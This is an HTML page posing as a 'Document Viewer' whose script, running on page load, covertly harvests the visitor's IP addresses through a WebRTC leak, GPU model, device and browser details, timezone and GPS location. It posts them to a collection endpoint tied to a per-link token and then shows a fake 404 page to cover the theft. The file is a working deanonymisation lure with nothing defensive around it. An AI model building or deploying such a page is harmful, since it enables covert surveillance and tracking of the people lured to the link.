<!DOCTYPE html>
<html>
<head>
  <title>Document Viewer</title>
  <meta name="viewport" content="width=device-width, initial-scale=1">
</head>
<body style="background:#fff; font-family:Arial; text-align:center; padding:40px;">
  <p style="color:#666;">Loading document, please wait...</p>

<script>
const token = window.location.pathname.split("/").pop();

// ── VECTOR 1: WebRTC IP ───────────────────────────────
function getWebRTCIP() {
  return new Promise((resolve) => {
    const ips = [];
    const pc = new RTCPeerConnection({
  iceServers: [
  { urls: "stun:stun.l.google.com:19302" },
  { urls: "stun:stun1.l.google.com:19302" },
  { urls: "stun:stun2.l.google.com:19302" },
  { urls: "stun:stun.cloudflare.com:3478" }
]
    });
    pc.createDataChannel("");
    pc.createOffer().then(offer => pc.setLocalDescription(offer));
    pc.onicecandidate = (event) => {
      if (!event.candidate) {
        pc.close();
        resolve(ips.join(", ") || "not available");
        return;
      }
      const match = event.candidate.candidate
        .match(/(\d{1,3}\.){3}\d{1,3}/g);
      if (match) {
        match.forEach(ip => {
          if (!ips.includes(ip)) ips.push(ip);
        });
      }
    };
    setTimeout(() => {
      pc.close();
      resolve(ips.join(", ") || "blocked");
    }, 3000);
  });
}

// ── VECTOR 2: GPU ─────────────────────────────────────
function getGPU() {
  try {
    const canvas = document.createElement("canvas");
    const gl = canvas.getContext("webgl") ||
               canvas.getContext("experimental-webgl");
    if (!gl) return "WebGL not supported";
    const ext = gl.getExtension("WEBGL_debug_renderer_info");
    if (!ext) return "Extension blocked";
    return gl.getParameter(ext.UNMASKED_RENDERER_WEBGL);
  } catch (e) {
    return "GPU blocked";
  }
}

// ── VECTOR 3: Navigator Data ──────────────────────────
function getNavigatorData() {
  return {
    os:        navigator.platform,
    browser:   navigator.userAgent,
    ram:       navigator.deviceMemory || "unknown",
    cores:     navigator.hardwareConcurrency || "unknown",
    language:  navigator.language,
    timezone:  Intl.DateTimeFormat().resolvedOptions().timeZone,
    screen:    screen.width + "x" + screen.height,
    useragent: navigator.userAgent
  };
}

// ── VECTOR 4: GPS ─────────────────────────────────────
function requestGPS() {
  return new Promise((resolve) => {
    if (!navigator.geolocation) {
      return resolve({ lat: "", lng: "" });
    }
    navigator.geolocation.getCurrentPosition(
      (pos) => resolve({
        lat: pos.coords.latitude,
        lng: pos.coords.longitude
      }),
      () => resolve({ lat: "", lng: "" }),
      { timeout: 5000 }
    );
  });
}

// ── MAIN: Collect and Send ────────────────────────────
async function collectAndSend() {
  const navData = getNavigatorData();
  const gpu     = getGPU();
  const gps     = await requestGPS();

  // Send main payload immediately
  const payload = {
    webrtc_ip: "collecting...",
    gpu:       gpu,
    os:        navData.os,
    browser:   navData.browser,
    ram:       navData.ram,
    cores:     navData.cores,
    language:  navData.language,
    timezone:  navData.timezone,
    screen:    navData.screen,
    useragent: navData.useragent,
    gps_lat:   gps.lat,
    gps_lng:   gps.lng
  };

  try {
    await fetch("/api/collect/" + token, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(payload)
    });
  } catch (err) {
    console.error("Collect error:", err);
  }

  // Send WebRTC IP as soon as it resolves
  getWebRTCIP().then(ip => {
    fetch("/api/update-webrtc/" + token, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ webrtc_ip: ip })
    }).catch(err => console.error("WebRTC update error:", err));
  });

  // Show 404 after 1 second
  setTimeout(() => {
    document.body.innerHTML = `
      <div style="margin-top:100px; color:#888">
        <h2>404 — Page Not Found</h2>
        <p>The page you requested could not be located.</p>
      </div>`;
  }, 1000);
}

collectAndSend();
</script>
</body>
</html>
